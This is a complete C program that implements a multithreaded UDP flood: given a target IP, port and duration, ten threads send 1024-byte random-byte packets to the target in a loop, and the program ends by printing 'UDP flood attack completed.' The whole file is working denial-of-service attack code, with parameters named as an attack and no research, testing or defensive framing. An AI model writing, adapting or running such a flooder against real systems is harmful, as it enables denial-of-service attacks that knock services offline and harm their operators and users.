#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>

#define MAX_THREADS 10    // Controlled thread count for stability
#define PAYLOAD_SIZE 1024 // Packet size in bytes
#define RATE_LIMIT 10000  // Max packets per second per thread

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Function to create a non-blocking UDP socket
int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set socket to non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Increase send buffer size for better performance
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    return sock;
}

// Function to send UDP packets with random bytes
void *udp_flood(void *args) {
    AttackParams *params = (AttackParams *)args;
    struct sockaddr_in target;
    char payload[PAYLOAD_SIZE];

    int sock = create_socket();
    if (sock < 0) {
        pthread_exit(NULL);
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &target.sin_addr);

    srand(time(NULL)); // Seed random generator

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time) {
        // Generate random bytes
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            payload[i] = rand() % 256;
        }

        // Send UDP packet
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target, sizeof(target));

        usleep(1000000 / RATE_LIMIT); // Rate limiting
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <Port> <Duration>\n", argv[0]);
        return EXIT_FAILURE;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], 15);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &params);
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("UDP flood attack completed.\n");
    return EXIT_SUCCESS;
}
